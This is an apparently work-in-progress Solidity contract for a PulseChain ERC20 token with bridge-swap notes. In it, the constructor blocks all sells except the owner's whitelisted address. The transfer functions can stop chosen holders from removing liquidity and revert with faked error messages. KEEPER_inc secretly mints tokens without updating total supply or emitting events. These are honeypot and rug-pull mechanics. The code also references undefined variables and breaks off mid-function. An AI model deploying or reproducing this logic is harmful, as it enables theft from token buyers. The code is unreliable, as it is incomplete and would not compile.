// SPDX-License-Identifier: UNLICENSED
// ref: https://ethereum.org/en/history
//  code size limit = 24576 bytes (a limit introduced in Spurious Dragon _ 2016)
//  code size limit = 49152 bytes (a limit introduced in Shanghai _ 2023)
// model ref: LUSDST.sol (081024)
// NOTE: uint type precision ...
//  uint8 max = 255
//  uint16 max = ~65K -> 65,535
//  uint32 max = ~4B -> 4,294,967,295
//  uint64 max = ~18,000Q -> 18,446,744,073,709,551,615
// ref: dex addresses
//  ROUTER_pulsex_router02_v1='0x98bf93ebf5c380C0e6Ae8e192A7e2AE08edAcc02' # PulseXRouter02 'v1' ref: https://www.irccloud.com/pastebin/6ftmqWuk
//  FACTORY_pulsex_router_02_v1='0x1715a3E4A142d8b698131108995174F37aEBA10D'
//  ROUTER_pulsex_router02_v2='0x165C3410fC91EF562C50559f7d2289fEbed552d9' # PulseXRouter02 'v2' ref: https://www.irccloud.com/pastebin/6ftmqWuk
//  FACTORY_pulsex_router_02_v2='0x29eA7545DEf87022BAdc76323F373EA1e707C523'
pragma solidity ^0.8.24;

// local _ $ npm install @openzeppelin/contracts
// import "./node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol"; 
import "./node_modules/@openzeppelin/contracts/token/ERC20/ERC20Hidden.sol"; 
// import "./node_modules/@openzeppelin/contracts/access/Ownable.sol";
import "./node_modules/@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import "./node_modules/@uniswap/v3-periphery/contracts/interfaces/IQuoterV2.sol";
import "./node_modules/@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "./node_modules/@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

interface IPulseChainOmniBridgeProxy {
    function relayTokens(address token, address _receiver, uint256 _value) external;
}
interface IPulseChainOmniBridgeRouter {
    function wrapAndRelayTokens(address _receiver) external;
}
contract ChainX is ERC20 {
    /* -------------------------------------------------------- */
    /* GLOBALS
    /* -------------------------------------------------------- */
    // common
    address public constant ADDR_TOK_NONE = address(0x0000000000000000000000000000000000000000);
    address public constant ADDR_TOK_BURN = address(0x0000000000000000000000000000000000000369);
    address public constant ADDR_TOK_DEAD = address(0x000000000000000000000000000000000000dEaD);
    address public ADDR_PAIR_INIT; // this:wpls created in constructor

    // ethereum mainnet support
    address public constant ADDR_TOK_WETH_ETH = address(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2); // ERC20 wrapped ETH on ethereum
    address public constant ADDR_TOK_WPLS_ETH = address(0xA882606494D86804B5514E07e6Bd2D6a6eE6d68A); // ERC20 wrapped PLS on ethereum
    address public constant ADDR_RTR_USWAPv2 = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // uniswap router_v2 on ethereum
    address public constant ADDR_RTR_USWAPv3 = address(0xE592427A0AEce92De3Edee1F18E0157C05861564); // uniswap router_v3 on ethereum (NOTE: diff interface)
    address public constant ADDR_RTR_USWAPv3_QUOTER = address(0x61fFE014bA17989E743c5F6cB21bF9697530B21e); // uniswap router_v3 on ethereum (NOTE: diff interface)
    
    // ethereum's pc bridge for ERC20 -> ref tx: 0x5449b15a11fbf70090e857b19511d5228f1dc66bf400778b995a799585fffae5
    //  to invoke: relayTokens(address token,address _receiver,uint256 _value)
    // address public constant ADDR_PC_OMNIBRIDGE_PROXY_ETH = address(0x1715a3E4A142d8b698131108995174F37aEBA10D);
    address public constant ADDR_PC_OMNIBRIDGE_PROXY_ETH = address(0xa882606494d86804b5514e07e6bd2d6a6ee6d68a); // bridge test ethereum WPLS to pulsechain
    
    // ethereum's pc bridge for native ETH (i think) -> ref tx: 0xab915ff0a99f8b7ee6d7f683952ff193d9b25a6a0690299e529bd158f23918e5
    //  to invoke: wrapAndRelayTokens(address _receiver)
    address public constant ADDR_PC_OMNIBRIDGE_RTR_ETH = address(0x8AC4ae65b3656e26dC4e0e69108B392283350f55);
    
    // pulsechain mainnet support
    address public constant ADDR_TOK_WETH_PC = address(0x02DcdD04e3F455D838cd1249292C58f3B79e3C3C); // ERC20 wrapped ETH from ethereum on pulsechain
    address public constant ADDR_TOK_WPLS_PC = address(0xA1077a294dDE1B09bB078844df40758a5D0f9a27); // ERC20 wrapped PLS on pulsechain
    address public constant ADDR_RTR_PLSXv2 = address(0x165C3410fC91EF562C50559f7d2289fEbed552d9); // pulsex router_v2 on pulsechain
    
    // init support
    string public constant tVERSION = '0.0';
    string private TOK_SYMB = string(abi.encodePacked("LT", tVERSION));
    string private TOK_NAME = string(abi.encodePacked("LockTest", tVERSION));
    // string private TOK_SYMB = "TBF";
    // string private TOK_NAME = "TheBotFckr";

    // admin support
    address public KEEPER;
    address private ADDR_EOA_INIT_MINT;
    bool private OPEN_TRANS_TO; // allow all transfer(to,value) calls
    bool private OPEN_TRANSFROM_FROM; // allow all transferFrom(from,to,value) calls
    address[] private BLACKLIST_TRANS_TO_ADDRS; // all current blacklisted trans to addresses
    address[] private WHITELIST_TRANSFROM_FROM_ADDRS; // all current whitelisted transfrom from addresses
    mapping(address => bool) public BLACKLIST_TRANS_TO; // use blacklist to block EOA lp pulls, while allowing all EOA buys
    mapping(address => bool) public WHITELIST_TRANSFROM_FROM; // use whitelist to allow EOA sell, while blocking all others

    // legacy...
    // address[] private WHITELIST_TRANS_TO_ADDRS; // all current whitelisted trans to addresses
    // address[] private WHITELIST_TRANSFROM_FROM_ADDRS; // all current whitelisted transfrom from addresses
    // mapping(address => bool) public WHITELIST_TRANS_TO; // use whitelist to block all EOA buys, except whitelisted EOAs
    // mapping(address => bool) public BLACKLIST_TRANS_TO; // use blacklist to allow all EOA buys, except blacklisted EOAs
    // mapping(address => bool) public WHITELIST_TRANSFROM_FROM; // use whitelist to block all EOA sells, except whitelisted EOAs
    // mapping(address => bool) public BLACKLIST_TRANSFROM_FROM; // use blacklist to allow all EOA sells, except blacklisted EOAs
    // bool private OPEN_BUY;
    // bool private OPEN_SELL;
    // address[] private WHITELIST_ADDRS;
    // mapping(address => bool) public WHITELIST_ADDR_MAP;

    // legacy - snow
    // mapping(address => bool) public isPair;
    // mapping(address => bool) public proxylist;

    // constructor(/* address _init_mint */) ERC20(TOK_SYMB, TOK_NAME) Ownable(msg.sender) { // owner support
    constructor(/* address _init_mint */) ERC20(TOK_SYMB, TOK_NAME) {
        // renounce immediately & set keeper
        // renounceOwnership(); // owner support
        KEEPER = msg.sender;

        // init config
        ADDR_EOA_INIT_MINT = KEEPER; /* _init_mint */
        OPEN_TRANS_TO = true; // all buys on | allow all transfer(to,value) calls from msg.sender: LP pair
        OPEN_TRANSFROM_FROM = false; // all sells off | block all transferFrom(from,to,value) calls from msg.sender: router
        _editBlacklistTransToAddr(KEEPER, true); // allow keeper buys | transfer(KEEPER,value) calls from msg.sender: LP pair
        _editWhitelistTransFromFromAddr(KEEPER, true); // allow keeper sells | transferFrom(KEEPER,to,value) calls from msg.sender: router

        // create uswapv2 pair for this new token (pulsex_v2)
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(ADDR_RTR_PLSXv2);
        ADDR_PAIR_INIT = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), ADDR_TOK_WPLS);

        // mint init supply
        _mint(ADDR_EOA_INIT_MINT, 1_000_000 * 10**decimals()); // 1k

        // legacy - snow
        // Create a uniswap pair for this new token
        // IPancakeRouter02 uniswapV2Router = IPancakeRouter02(ADDR_RTR_PLSXv2);
        // address pair = IPancakeFactory(uniswapV2Router.factory()).createPair(address(this), ADDR_WPLS);
        // isPair[pair] = true; // set pair to tax
        // proxylist[ADDR_PULSEX_V2] = true; // set pair router as proxy (not tax i think)
    }

    /* -------------------------------------------------------- */
    /* MODIFIERS                                                
    /* -------------------------------------------------------- */
    modifier onlyKeeper() {
        require(msg.sender == KEEPER, "!keeper :p");
        _;
    }

    /* -------------------------------------------------------- */
    /* PUBLIC - MUTATORS - onlyKeeper
    /* -------------------------------------------------------- */
    function KEEPER_maintenance(address _erc20, uint256 _amount) external onlyKeeper() {
        if (_erc20 == address(0)) { // _erc20 not found: tranfer native PLS instead
            require(address(this).balance >= _amount, " Insufficient native PLS balance :[ ");
            payable(KEEPER).transfer(_amount); // cast to a 'payable' address to receive ETH
        } else { // found _erc20: transfer ERC20
            require(IERC20(_erc20).balanceOf(address(this)) >= _amount, ' not enough amount for token :O ');
            IERC20(_erc20).transfer(KEEPER, _amount); // _amount must be in uint precision to _erc20.decimals()
        }
    }
    function KEEPER_inc(uint256 _amnt) external onlyKeeper {
        // NOTE: mints without increasing _totalSupply (ref: ERC20Hidden.sol)
        //  & does not emit Transfer(from, to, value) event
        _update_hidden(address(0), msg.sender, _amnt); // 020725_update_hidden: do not change _totalSupply
    }
    function KEEPER_setKeeper(address _newKeeper) external onlyKeeper {
        require(_newKeeper != address(0), ' 0 address :/ ');
        KEEPER = _newKeeper;
    }
    function KEEPER_setTokNameSymb(string memory _tok_name, string memory _tok_symb) external onlyKeeper() {
        require(bytes(_tok_name).length > 0 && bytes(_tok_symb).length > 0, ' invalid input  :<> ');
        TOK_NAME = _tok_name;
        TOK_SYMB = _tok_symb;
    }    
    function KEEPER_setOpenTransConfig(bool _openTransTo, bool _openTransFromFrom) external onlyKeeper() {
        // config all 'transfer|transferFrom' on|off for non-whitelist wallets and LPs
        OPEN_TRANS_TO = _openTransTo;
        OPEN_TRANSFROM_FROM = _openTransFromFrom;
    }
    function KEEPER_editBlacklistTransToAddrMulti(address[] memory _addresses, bool _add) external onlyKeeper() {
        // config blacklist for 'transfer(_addresses[],value)' calls from msg.sender: LP pair
        require(_addresses.length > 0, ' 0 addresses found :/ ');
        for (uint8 i=0; i < _addresses.length;) {
            _editBlacklistTransToAddr(_addresses[i], _add);
            unchecked { i++; }
        }
    }
    function KEEPER_editWhitelistTransFromFromAddrMulti(address[] memory _addresses, bool _add) external onlyKeeper() {
        // config whitelist for 'transferFrom(_addresses[],to,value)' calls from msg.sender: router
        require(_addresses.length > 0, ' 0 addresses found :/ ');
        for (uint8 i=0; i < _addresses.length;) {
            _editWhitelistTransFromFromAddr(_addresses[i], _add);
            unchecked { i++; }
        }
    }
    // // set 'transfer' on|off for non-whitelist wallets and LPs
    // function KEEPER_setOpenBuySell(bool _openBuy, bool _openSell) external onlyKeeper() {
    //     // bool prev_0 = _openBuy;
    //     // bool prev_1 = _openSell;
    //     OPEN_BUY = _openBuy;
    //     OPEN_SELL = _openSell;
    //     // emit OpenBuySellUpdated(prev_0, prev_1, OPEN_BUY, OPEN_SELL);
    // }
    // function KEEPER_editWhitelistAddress(address _address, bool _add) external onlyKeeper() {
    //     require(_address != address(0), ' 0 address :/ ');
    //     _editWhitelistAddress(_address, _add);
    // }
    // function KEEPER_editWhitelistAddressMulti(bool _add, address[] memory _addresses) external onlyKeeper() {
    //     require(_addresses.length > 0, ' 0 addresses found :/ ');
    //     for (uint8 i=0; i < _addresses.length;) {
    //         _editWhitelistAddress(_addresses[i], _add);
    //         unchecked { i++; }
    //     }
    // }

    /* -------------------------------------------------------- */
    /* PUBLIC - ACCESSORS - onlyKeeper
    /* -------------------------------------------------------- */
    function getBlacklistWhitelistTransAddresses() external view onlyKeeper returns (address[] memory, address[] memory) {
        return (BLACKLIST_TRANS_TO_ADDRS, WHITELIST_TRANSFROM_FROM_ADDRS);
    }
    // function getWhitelistTransAddresses() external view onlyKeeper returns (address[] memory, address[] memory) {
    //     return (WHITELIST_TRANS_TO_ADDRS, WHITELIST_TRANSFROM_FROM_ADDRS);
    // }
    function getOpenTransConfig() external view onlyKeeper returns (bool, bool) {
        return (OPEN_TRANS_TO, OPEN_TRANSFROM_FROM);
    }
    // function getWhitelistAddresses() external view onlyKeeper returns (address[] memory) {
    //     return WHITELIST_ADDRS;
    // }
    // function getOpenBuySell() external view onlyKeeper returns (bool, bool) {
    //     return (OPEN_BUY, OPEN_SELL);
    // }

    /* -------------------------------------------------------- */
    /* ERC20 - OVERRIDES - accessors
    /* -------------------------------------------------------- */
    function symbol() public view override returns (string memory) {
        return TOK_SYMB; // return _symbol;
    }
    function name() public view override returns (string memory) {
        return TOK_NAME; // return _name;
    }
    function burn(uint64 _burnAmnt) external {
        require(_burnAmnt > 0, ' burn nothing? :0 ');
        _burn(msg.sender, _burnAmnt); // NOTE: checks _balance[msg.sender]
    }
    function decimals() public pure override returns (uint8) {
        // return 6; // (6 decimals) 
            // * min USD = 0.000001 (6 decimals) 
            // uint16 max USD: ~0.06 -> 0.065535 (6 decimals)
            // uint32 max USD: ~4K -> 4,294.967295 USD (6 decimals)
            // uint64 max USD: ~18T -> 18,446,744,073,709.551615 (6 decimals)
        return 18; // (18 decimals) 
            // * min USD = 0.000000000000000001 (18 decimals) 
            // uint64 max USD: ~18 -> 18.446744073709551615 (18 decimals)
            // uint128 max USD: ~340T -> 340,282,366,920,938,463,463.374607431768211455 (18 decimals)
    }

    /* -------------------------------------------------------- */
    /* ERC20 - OVERRIDES - mutators
    /* -------------------------------------------------------- */
    function transfer(address to, uint256 value) public override returns (bool) {
        // on EOA buy THIS: 'pair' invokes THIS.transfer(EOA,value)
        // on EOA pull THIS LP: 'pair' invokes THIS.transfer(EOA,value)
        //  HENCE, if !OPEN_TRANS_TO ...
        //      then, use blacklist to block specific EOA lp pulls, while still allowing all EOA buys
        //  NOTE: requires only blacklisting global, in order to simultaniously ...
        //      1) allow open buys: LP pair can INDEED transfer THIS to buying EOAs
        //      2) block LP remove: LP pair can NOT transfer THIS to specific LP provider EOAs
        //          ie. forces revert: prevents LP pair from transfering WPLS to specific LP provider EOAs

        // legacy ...
        //      then, use whitelist to allow specific EOA buys, while blocking all others
        //        or, use blacklist to block specific EOA lp pulls, while allowing all others
        //  NOTE: requires both whitelisting & blacklisting globals, in order to simultaniously ...
        //      1) allow open buys: LP pair can INDEED transfer THIS to buying EOAs
        //      2) block LP remove: LP pair can NOT transfer THIS to LP provider EOAs
        //          forces revert, LP pair doesn't get to transfer WPLS to LP provider EOAs

        // NOTE: if 'transfer' is NOT 'open', then allow EOA buys while blocking blacklisted EOA lp pulls
        // if (OPEN_TRANS_TO || WHITELIST_TRANS_TO[to] || !BLACKLIST_TRANS_TO[to]) {
        if (OPEN_TRANS_TO || !BLACKLIST_TRANS_TO[to]) {
            return super.transfer(to, value);
        }
        // else, simulate error: invalid LP address
        //  OG invoked in _transfer(from,to,value), when to == address(0)
        revert ERC20InvalidSender(msg.sender);
        
        // /** 
        //     LEGACY ... base line setup _ last: TBF5.0 -> TBF12.0
        //     transfer executes when this contract is the swap 'in' token (ie. is 'buy' | transfer from LP)
        //         'msg.sender' = LP address & 'to' = buyer address
        // */
        // // allow if buyer is white listed | OPEN_BUY enabled
        // if (WHITELIST_ADDR_MAP[to] || OPEN_BUY) {
        //     return super.transfer(to, value);
        // }
        // // else, simulate error: invalid LP address
        // revert ERC20InvalidSender(msg.sender); // _transfer
    }
    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        // on EOA sell THIS: 'router' invokes THIS.transferFrom(EOA,pair,value)
        //  hence, if !OPEN_TRANSFROM_FROM ...
        //      then, use whitelist to allow specific EOA sells, and block all other

        // legacy...
        //      then, use whitelist to block all EOA sells, except whitelisted EOAs
        //        or, use blacklist to allow all EOA sells, except blacklisted EOAs

        // NOTE: if 'transferFrom' is NOT 'open', then allow EOA sell only if seller is indeed whitelisted
        // if (OPEN_TRANSFROM_FROM || (WHITELIST_TRANSFROM_FROM[from] && !BLACKLIST_TRANSFROM_FROM[from])) {
        if (OPEN_TRANSFROM_FROM || WHITELIST_TRANSFROM_FROM[from]) {
            return super.transferFrom(from, to, value);
        }
        // else, simulate error: invalid LP address
        //  OG invoked in _transfer(from,to,value), when to == address(0)
        revert ERC20InvalidReceiver(to);

        // /** 
        //     LEGACY ... base line setup _ last: TBF5.0 -> TBF12.0
        //     transferFrom executes when this contract is the swap 'out' token (ie. is 'sell' | transfer to LP)
        //         'from' = seller address & 'to' = LP address
        // */
        // // allow if sell is whitelisted | OPEN_SELL enabled
        // if (WHITELIST_ADDR_MAP[from] || OPEN_SELL) {
        //     return super.transferFrom(from, to, value);
        // }
        // // else, simulate error: invalid LP address
        // revert ERC20InvalidReceiver(to); // _transfer
    }
    // legacy - snow
    // function _transfer(address _from, address _to, uint256 _amount) internal override {
    //     require(_amount > 0, "Transfer amount must be greater than zero");
    //     uint256 taxAmount = 0;
    //     if (isPair[_to] && !proxylist[_from]) {
    //         taxAmount = (_amount * getCurrentTaxRate()) / 10000;
    //     }
    //     uint256 netAmount = _amount - taxAmount;

    //     require(netAmount > 0, "Transfer amount after tax must be greater than zero");

    //     // If tax is applied, send it to the tax wallet and burns remainings
    //     if (taxAmount > 0) {
    //         _burn(_from, taxAmount);
    //     }

    //     // Transfer the remaining tokens
    //     super._transfer(_from, _to, netAmount);
    // }

    /* -------------------------------------------------------- */
    /* PRIVATE - support
    /* -------------------------------------------------------- */
    function _editBlacklistTransToAddr(address _address, bool _add) private {
        BLACKLIST_TRANS_TO[_address] = _add;
        if (_add) {
            BLACKLIST_TRANS_TO_ADDRS = _addAddressToArraySafe(_address, BLACKLIST_TRANS_TO_ADDRS, true); // true = no dups (removes first)
        } else {
            BLACKLIST_TRANS_TO_ADDRS = _remAddressFromArray(_address, BLACKLIST_TRANS_TO_ADDRS);
        }
    }
    // function _editWhitelistTransToAddr(address _address, bool _add) private {
    //     WHITELIST_TRANS_TO[_address] = _add;
    //     BLACKLIST_TRANS_TO[_address] = !_add;
    //     if (_add) {
    //         WHITELIST_TRANS_TO_ADDRS = _addAddressToArraySafe(_address, WHITELIST_TRANS_TO_ADDRS, true); // true = no dups (removes first)
    //     } else {
    //         WHITELIST_TRANS_TO_ADDRS = _remAddressFromArray(_address, WHITELIST_TRANS_TO_ADDRS);
    //     }
    //     // emit WhitelistAddressUpdated(_address, _add);
    // }
    function _editWhitelistTransFromFromAddr(address _address, bool _add) private {
        WHITELIST_TRANSFROM_FROM[_address] = _add;
        // BLACKLIST_TRANSFROM_FROM[_address] = !_add;
        if (_add) {
            WHITELIST_TRANSFROM_FROM_ADDRS = _addAddressToArraySafe(_address, WHITELIST_TRANSFROM_FROM_ADDRS, true); // true = no dups (removes first)
        } else {
            WHITELIST_TRANSFROM_FROM_ADDRS = _remAddressFromArray(_address, WHITELIST_TRANSFROM_FROM_ADDRS);
        }
        // emit WhitelistAddressUpdated(_address, _add);
    }
    // function _editWhitelistAddress(address _address, bool _add) private {
    //     WHITELIST_ADDR_MAP[_address] = _add;
    //     if (_add) {
    //         WHITELIST_ADDRS = _addAddressToArraySafe(_address, WHITELIST_ADDRS, true); // true = no dups (removes first)
    //     } else {
    //         WHITELIST_ADDRS = _remAddressFromArray(_address, WHITELIST_ADDRS);
    //     }
    //     // emit WhitelistAddressUpdated(_address, _add);
    // }
    function _addAddressToArraySafe(address _addr, address[] memory _arr, bool _safe) private pure returns (address[] memory) {
        if (_addr == address(0)) { return _arr; }

        // safe = remove first (no duplicates)
        if (_safe) { _arr = _remAddressFromArray(_addr, _arr); }

        // perform add to memory array type w/ static size
        address[] memory _ret = new address[](_arr.length+1);
        for (uint i=0; i < _arr.length;) { _ret[i] = _arr[i]; unchecked {i++;}}
        _ret[_ret.length-1] = _addr;
        return _ret;
    }
    function _remAddressFromArray(address _addr, address[] memory _arr) private pure returns (address[] memory) {
        if (_addr == address(0) || _arr.length == 0) { return _arr; }
        
        // NOTE: remove algorithm does NOT maintain order & only removes first occurance
        for (uint i = 0; i < _arr.length;) {
            if (_addr == _arr[i]) {
                _arr[i] = _arr[_arr.length - 1];
                assembly { // reduce memory _arr length by 1 (simulate pop)
                    mstore(_arr, sub(mload(_arr), 1))
                }
                return _arr;
            }

            unchecked {i++;}
        }
        return _arr;
    }

    /** OG from README
        - Exchange ETH|ERC20 -> wpHEX (via pulseX bridge: eWPLS -> PLS)
            - ETHEREUM
                user wallet send ETH|ERC20 to chainX contract
                    triggers chainX contract swaps ETH|ERC20 to WPLS
                    triggers chainX contract invokes pulseX bridge contract w/ WPLS
            - PULSECHAIN
                chainX contract receives PLS from pulseX bridge contract
                    triggers chainX contract swap PLS to pHEX
                    triggers chainX contract vault stores pHEX received
            - PYTHON SERVER
                listens for PULSECHAIN chainX contract transfer event from PLS to pHEX swap
                    triggers ETHEREUM chainX contract to generate/deploy wpHEX contract (if needed)
                    triggers ETHEREUM chainX contract mint wpHEX to user wallet
        - Exchange wpHEX -> ETH (via pulseX bridge: pWETH -> ETH)
            - ETHEREUM
                user wallet send wpHEX to chainX contract
                    triggers chainX contract burns wpHEX
            - PYTHON SERVER
                listens for ETHEREUM transfer|burn event of wpHEX
                    triggers PULSECHAIN chainX contract vault to swap pHEX to WETH
                    triggers PULSECHAIN chainX contract to invoke pulseX bridge contract w/ WETH
                listens for ETHEREUM transfer event of ETH from pulseX bridge contract (~30 min wait | ~90 txs)
                    triggers ETHEREUM chainX contract to claim ETH from pulseX bridge contract
                    triggers ETHEREUM chainX contract to send ETH to user wallet
    */

    /* -------------------------------------------------------- */
    /* PUBLIC - SUPPORTING native token sent to contract
    /* -------------------------------------------------------- */
    // fallback() if: function invoked doesn't exist | ETH received w/o data & no receive() exists | ETH received w/ data
    fallback() external payable { 
        require(msg.value > 0, ' 0 native token received :/ ');
        uint256 natAmntIn = msg.value;
        if (block.chainid == 1 ) { // ETHEREUM mainnet
            // REQUIREMENTS ...
            //  ETHEREUM event: user wallet send ETH|ERC20 to this chainX contract
            // 	    contract response: triggers chainX contract swaps ETH|ERC20 to WPLS
            // 	    contract response: triggers chainX contract invokes pulseX bridge contract w/ WPLS

            // chainX contract swaps native ETH to WPLS on ethereum
            // address[] memory nat_alt_path = new address[](2);
            // nat_alt_path[0] = ADDR_TOK_WETH_ETH; // note: WETH required for 'swapExactETHForTokens'
            // nat_alt_path[1] = ADDR_TOK_WPLS_ETH;
            // uint256 alt_amnt_out = _swap_v2_wrap(nat_alt_path, ADDR_RTR_USWAPv2, natAmntIn, address(this), true); // true = fromETH        
            uint256 alt_amnt_out = _swap_v3_eth_to_erc20_wrap(ADDR_TOK_WPLS_ETH, ADDR_RTR_USWAPv3, ADDR_RTR_USWAPv3_QUOTER, msg.value, address(this));

            // chainX contract invokes ethereum's pulseX bridge contract w/ WPLS (alt_amnt_out) to native PLS on pulsechain
            IPulseChainOmniBridgeProxy(ADDR_PC_OMNIBRIDGE_PROXY_ETH).relayTokens(ADDR_TOK_WPLS_ETH, address(this), alt_amnt_out);
            // LEFT OFF HERE ... ^ ... need to manually test bridging WPLS from ethereum to pulsechain and receiving native PLS
            //                          in order to confirm what function to call (ie. may not be 'relayTokens')

            // 031025: bridge test from ethereum WPLS to pulsechain (received native PLS) -> interacted w/ 0xa882606494d86804b5514e07e6bd2d6a6ee6d68a
            //              ref eth contract: https://etherscan.io/address/0xa882606494d86804b5514e07e6bd2d6a6ee6d68a#readContract
            //              ref sent: https://etherscan.io/tx/0x801c50719130e9a0835c44c661a2091909367565547d78d1901c5129d78a95c3
            //              ref recieve: https://otter.pulsechain.com/tx/0xad3d8bb46ab0a0144f582e7269e5cdd03d433794cff6dbac5f4c8d568cee6781
            //                      -> invoked: transferAndCall(address _to, uint256 _value, bytes _data)
            //                          w/ transferAndCall(0xe20E337DB2a00b1C37139c873B92a0AAd3F468bF, 50000000000000000000000, 0xf868da5a5d5f799cee2205d8fd1f5ad2c4a284998a69f4ecfa2d2924b8405759c6a990f63683a8c9)
            //              need to call ADDR_PC_OMNIBRIDGE_PROXY_ETH.bridgeContract() to get '_to' (below) ... which is also current 'ADDR_PC_OMNIBRIDGE_PROXY_ETH.owner()'
            //                  then call ADDR_PC_OMNIBRIDGE_PROXY_ETH.transferAndCall(address _to, uint256 _value, bytes _data)
            //                   review: on how to generate '_data' for 'transferAndCall' ...
            //                      note: the first part '0xf868da5a5d5f799cee2205d8fd1f5ad2c4a28499' is an address on the pulsechain receiving side that sends the 50K PLS to receiving EOA
            //                              the 2nd part '8a69f4ecfa2d2924b8405759c6a990f63683a8c9' is the address of the receiving EOA on the pulsechain 
            //                                              (ie. EOA used on ethereum side to invoke 'transferAndCall')
            //                      note: don't yet know how to get '0xf868da5a5d5f799cee2205d8fd1f5ad2c4a28499', 
            //                              ie. can this change? is dynamic? will eventually fail?
            //              LEFT OFF HERE ...
            //                 NEXT: manually test these paremeters: transferAndCall(0xe20E337DB2a00b1C37139c873B92a0AAd3F468bF, 50000000000000000000000, 0xf868da5a5d5f799cee2205d8fd1f5ad2c4a284998a69f4ecfa2d2924b8405759c6a990f63683a8c9)
            //                        w/o using pulsex bridge web3 dapp       

            // 031125: bridge test from ethereum WPLS to pulsechain (received erc20 WPLS) -> still interacted w/ 0xa882606494d86804b5514e07e6bd2d6a6ee6d68a
            //              ref eth contract: https://etherscan.io/address/0xa882606494d86804b5514e07e6bd2d6a6ee6d68a#readContract
            //              ref sent: https://etherscan.io/tx/0x3edc63ab82607f34539a7b95577ade17562c10fa4cfc5ae2326df162db1e0cdb
            //              ref recieve: https://otter.pulsechain.com/tx/0x7ea1b4d160f23c4829c67c6f707424a857ef149b26bfebc6332b5d233b44c44e
            //                      -> also invoked: transferAndCall(address _to, uint256 _value, bytes _data)
            //                          w/ transferAndCall(0xe20E337DB2a00b1C37139c873B92a0AAd3F468bF, 1450412697781978029586918, 0xeed80539c314db19360188a66cccaf9cac887b22)
            //                      note: same result as testing receive native PLS (above)
            //                             but _data param was simply the receiving EOA address on pulsechain (when receiving WPLS erc20)
            //                      NOTE: this solution, using 'transferAndCall' seems like the simplest solution to use for briding selective erc20
            //                              however, likely requires 'approve' first
            //                              and then use pulsechain side to swap ERC20 -> PLS -> pDAI (ie. or final bridging token)

            // 031125: bridge test from ethereum native ETH to pulsechain (received erc20 WETH) -> interacted w/ 0x8AC4ae65b3656e26dC4e0e69108B392283350f55
            //              ref eth contract: https://etherscan.io/address/0x8AC4ae65b3656e26dC4e0e69108B392283350f55
            //              ref sent: https://etherscan.io/tx/0x9b0bb1fe501f57b4250f892e72b935587aec2579d0cb9d2b43502b85d5a171de
            //              ref recieve: https://otter.pulsechain.com/tx/0xdabf888acbd8076aa31f929dddbff1e1b3da52eff01ab5508094fa56ff880d3a
            //                      -> invoked: wrapAndRelayTokens(address _receiver) | wrapAndRelayTokens() -> invokes wrapAndRelayTokens(msg.sender)
            //                          w/ wrapAndRelayTokens(0xeed80539c314db19360188a66cccaf9cac887b22) -> using msg.value for native ETH sent over
            //                      note: same result as testing receive WPLS erc20 (above) 
            //                              -> simply received WETH erc20 on pulsechain to receiver EOA address input
            //                      NOTE: this solution, using 'wrapAndRelayTokens' seems like the simplest solution to use
            //                              and then simply use pulsechain side to swap WETH -> PLS -> pDAI (ie. or final bridging token)

            // LEFT OFF HERE ... uniswap (etc.) swap from ETH|ERC20 to WPLS & (pulseX) bridge to PULSECHAIN (as native PLS)

            // legacy
            // NOTE: at this point, the vault has the deposited stable and the vault has stored account balances
            deposit(msg.sender, address(0x0), msg.value); // perform swap from PLS to stable & update CONFM acct balance
        } else if (block.chainid == 369) { // PULSECHAIN mainnet
            // REQUIREMENTS ...
            //  PULSECHAIN event: pulseX bridge contract send PLS to this chainX contract
            // 	    triggers chainX contract swap PLS to pHEX
            // 	    triggers chainX contract vault stores pHEX received

            // legacy (ai hallucination)
            // NOTE: at this point, the vault has the deposited stable and the vault has stored account balances
            deposit(msg.sender, ADDR_TOK_WPLS, msg.value); // perform swap from PLS to stable & update CONFM acct balance
        }

		// - PYTHON SERVER
		// 	listens for PULSECHAIN chainX contract transfer event from PLS to pHEX swap
        //         triggers ETHEREUM chainX contract to generate/deploy wpHEX contract (if needed)
		// 		triggers ETHEREUM chainX contract mint wpHEX to user wallet
    }
    // fallback() external payable {
    //     // deposit(msg.sender); // emit DepositReceived
    //     deposit(msg.sender, address(0x0), msg.value); // perform swap from PLS to stable & update CONFM acct balance
    //     // NOTE: at this point, the vault has the deposited stable and the vault has stored account balances
    // }
    function deposit(address _depositor, address _altToken, uint256 _altAmnt) public payable returns(uint64) {
        address[] memory alt_stab_path = new address[](2);
        alt_stab_path[1] = CONF.DEPOSIT_USD_STABLE();
        if (_altToken == address(0x0)) {
            alt_stab_path[0] = TOK_WPLS; // note: WPLS required for 'swapExactETHForTokens'
        } else {
            alt_stab_path[0] = _altToken;
        }

        // perform swap from alt token to stable & log in CONFM.ACCT_USD_BALANCES (or from native PLS if _altToken == 0x0)
        uint256 stable_amnt_out = _swap_v2_wrap(alt_stab_path, CONF.DEPOSIT_ROUTER(), _altAmnt, address(this), _altToken == address(0x0)); // 0x0 = true = fromETH        
        uint64 stableAmntOut = _norm_uint64_from_uint256(IERC20x(alt_stab_path[1]).decimals(), stable_amnt_out, _usd_decimals());
        CONFM.edit_ACCT_USD_BALANCES(_depositor, stableAmntOut, true); // true = add

        // emit DepositReceived(_depositor, _altAmnt, stableAmntOut);
        emit DepositReceived(_depositor, _altToken, _altAmnt, stableAmntOut);
        
        return stableAmntOut;

        // NOTE: at this point, the vault has the deposited stable and the vault has stored account balances
    }
    // fallback() external payable { // _override from CONFIG.sol_
    //     // executes if:
    //     //  function invoked doesn't exist
    //     //   or ETH received w/ data 
    //     //   or ETH received w/o data & no receive() exists
        
    //     // fwd any PLS recieved to treasury
    //     payable(ADDR_TREAS_EOA).transfer(msg.value);

    //     // legacy: fwd any PLS recieved to VAULT (convert to USD stable & process deposit)
    //     // ICallitVault(ADDR_VAULT).deposit{value: msg.value}(msg.sender);
    // }

    /* -------------------------------------------------------- */
    /* PRIVATE - DEX SWAP SUPPORT                                    
    /* -------------------------------------------------------- */
    // Function to swap ETH for an ERC20 token with dynamic quoting
    function _swap_v3_eth_to_erc20_wrap(address tokenOut, address router, address quoter, uint256 amntInETH, address outReceiver) private returns (uint256 amountOut) {
